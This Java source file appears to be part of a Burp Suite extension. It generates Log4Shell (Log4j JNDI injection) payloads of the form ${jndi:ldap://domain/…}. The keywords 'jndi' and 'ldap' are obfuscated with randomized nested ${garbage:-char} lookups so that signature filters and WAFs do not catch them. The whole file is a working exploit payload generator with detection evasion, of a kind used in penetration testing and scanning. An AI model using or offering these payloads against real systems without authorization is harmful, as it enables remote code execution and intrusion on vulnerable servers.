package burp.poc.impl;

import burp.poc.IPOC;
import burp.utils.Utils;

public class POC2 implements IPOC {
    private String confusion() {
        StringBuilder result = new StringBuilder();
        result.append(confusionChars(new String[]{"j", "n", "d", "i"}));
        result.append(":");
        result.append(confusionChars(new String[]{"l", "d", "a", "p"}));
        return result.toString();
    }

    private String confusionChars(String[] _chars) {
        StringBuilder result = new StringBuilder();
        int confusionCount = Utils.GetRandomNumber(1, 4);
        for (String _char :
                _chars) {
            if (confusionCount > 0) {
                boolean useConfusion = Utils.GetRandomBoolean();
                if (useConfusion) {
                    confusionCount--;
                    result.append(confusionChar(_char));
                } else {
                    result.append(_char);
                }
            } else {
                result.append(_char);
            }
        }
        return result.toString();
    }

    private String confusionChar(String _char) {
        int garbageCount = Utils.GetRandomNumber(2, 5);
        StringBuilder garbage = new StringBuilder();
        for (int i = 0; i < garbageCount; i++) {
            int garbageLength = Utils.GetRandomNumber(3, 6);
            String garbageWord = Utils.GetRandomString(garbageLength);
            garbage.append(garbageWord).append(":");
        }
        return String.format("${%s-%s}", garbage, _char);
    }

    @Override
    public String generate(String domain) {
        return "${" + confusion() + "://" + domain + "/" + Utils.GetRandomNumber(100000, 999999) + "}";
    }
}